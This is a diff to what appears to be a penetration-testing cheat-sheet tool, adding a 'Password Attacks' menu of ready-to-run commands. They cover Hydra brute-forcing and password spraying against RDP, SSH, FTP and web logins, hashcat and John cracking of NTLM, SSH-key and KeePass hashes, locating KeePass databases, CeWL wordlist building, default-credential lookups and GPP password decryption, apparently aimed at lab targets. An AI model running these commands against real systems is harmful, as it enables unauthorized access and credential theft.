@@ -1377,7 +1377,49 @@ menu_structure = {
                 
             
     },
-    "Password Attacks": {},
+    "Password Attacks": 
+    {
+    "Hydra":
+        [
+        ("hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://$IP","Spraying"),
+        ("hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://$IP","SSH"),
+        ("hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://$IP","FTP"),
+        ("hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid\"","HTTP Post Login 1"),
+        ("sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/department/login.php:username=admin&password=^PASS^:Invalid Password\"","HTTP Post Login 2"),
+        ("hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/ :F=403'","HTTP Post Login Base64"),
+        ],
+    "Hashcat & John": 
+        [
+        ("hashcat --help | grep -i \"ntlm\"","NTLM Hashcat Help"),
+        ("hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","NTLM Crack"),
+        ("ssh2john ssh_key > ssh.hash","SSH Private key"),
+        ("john --wordlist=darkweb2017-top10.txt id_rsa.hash","SSH Private key"),
+        ("ssh -i ssh_key nullbyte@$IP","SSH Private key"),
+        ],
+    "Keepass Cracking":
+        [
+        ("Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","Find KeePass DB"),
+        ("keepass2john Database.kdbx > keepass.hash","Convert to John Format"),
+        ("KeePass Hashcat Help","hashcat --help | grep -i \"KeePass\""),
+        ("hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force","KeePass Crack"),
+        ],
+    "Generate Wordlist from Webpage":
+        [
+        ("cewl http://postfish.off/team.html -m 5 -w team.txt","CEWL"),
+        ("cewl http://192.168.233.61:8081/ | grep -v CeWL > custom-wordlist.txt","CEWL Custom Wordlist"),
+        ("cewl --lowercase http://192.168.233.61:8081/ | grep -v CeWL >> custom-wordlist.txt","CEWL Lowercase Wordlist Append"),
+        ],
+    "Default credentials":
+        [
+        ("cd /usr/share/seclists/Passwords/Default-Credentials","Default creds location"),
+        (" grep -r \"<NAME>\"","Search Default Creds for Specific Term"),
+        ("grep -r \"Sonatype\"","Search Default Creds for \"Sonatype\""),
+        ],
+    "GPP Password Policy":
+        [
+        ("gpp-decrypt \"edBSHOw...jTLfCuNH8pG5aSVYdYw/NglVmQ\"","GPP Decrypt"),
+        ],
+    },
     "Transferring Exploits": {},
     "Port Redirection": {}
 }
